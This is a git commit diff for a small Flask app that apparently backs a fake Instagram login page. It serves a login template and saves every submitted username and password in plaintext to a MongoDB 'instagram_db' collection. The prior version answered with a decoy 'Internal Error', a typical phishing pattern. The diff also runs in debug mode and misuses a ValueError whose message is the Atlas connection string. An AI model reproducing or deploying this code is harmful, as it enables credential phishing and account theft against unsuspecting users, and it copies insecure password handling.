f2611c1f10ee90c742b187f243d45ace560e5dc7
Danish Khan <danisk397@gmail>
2025-12-01 15:05:44 +0530

    Added MongoDB Atlas connection

--- app.py
+++ app.py
@@ -1,29 +1,49 @@
 from flask import Flask, render_template, request
 from pymongo import MongoClient
+import os
 
 app = Flask(__name__)
 
-# Replace with your own Atlas connection string:
-client = MongoClient("mongodb+srv://danish:<db_password>@cluster0.wiieqp8.mongodb.net/?appName=Cluster0")
+# -----------------------------
+# CONNECT TO MONGO ATLAS
+# -----------------------------
+# This reads the MONGO_URI from Render environment variables
+mongo_uri = os.environ.get("MONGO_URI")
 
-db = client["instagram_db"]
-users = db["users"]
+# If the variable is missing, avoid app crash
+if not mongo_uri:
+    raise ValueError("mongodb+srv://danish:<db_password>@cluster0.wiieqp8.mongodb.net/?appName=Cluster0")
 
+client = MongoClient(mongo_uri)
+
+# DATABASE & COLLECTION
+db = client["instagram_db"]       # Database name you created
+users = db["users"]               # Collection name you created
+
+# -----------------------------
+# ROUTES
+# -----------------------------
 @app.route("/")
 def login_page():
     return render_template("login.html")
+
 
 @app.route("/login", methods=["POST"])
 def login():
     username = request.form.get("username")
     password = request.form.get("password")
 
+    # Store user login into MongoDB
     users.insert_one({
         "username": username,
         "password": password
     })
 
-    return "Internal Error"
+    return "✔ Login Data Saved Successfully!"
 
+
+# -----------------------------
+# MAIN
+# -----------------------------
 if __name__ == "__main__":
-    app.run()
+    app.run(debug=True)
